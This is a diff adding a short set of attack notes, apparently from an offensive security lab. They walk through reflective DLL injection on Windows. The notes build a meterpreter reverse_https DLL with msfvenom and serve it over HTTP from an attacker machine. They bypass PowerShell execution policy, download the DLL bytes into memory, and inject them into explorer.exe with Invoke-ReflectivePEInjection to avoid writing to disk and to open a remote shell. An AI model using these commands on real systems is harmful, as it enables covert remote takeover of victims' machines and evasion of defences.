@@ -1,0 +1,24 @@
+#This isn't properly a script but a set of steps to follow to perform a DLL's PE Injection through Invoke-ReflectivePEInjection.ps1 script.
+
+ - In first place, we create a payload with MSFVenom and make it accesible through HTTP requests in our Kali machine:
+        
+       sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.208 LPORT=4444 -f dll -o /var/www/html/met.dll; sudo systemctl start apache2 
+
+ - Then, in a CMD session on the victim machine, we open a PowerShell session with script execution capabilities:
+
+        PowerShell -Exec Bypass
+
+ - Then we execute the following lines to asign in variables the following parameters:
+
+        $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.208/met.dll')
+        $procid = (Get-Process -Name explorer).Id
+
+ - Import the script we have store in some way on the machine:
+
+        Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
+
+ - And make use of it through the variables created before:
+
+        Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+
+ With this, we inject in memory bypassing "disk writting" our DLL and executing a Shellcode traht we can catch with a multi/handler with msfvenom.
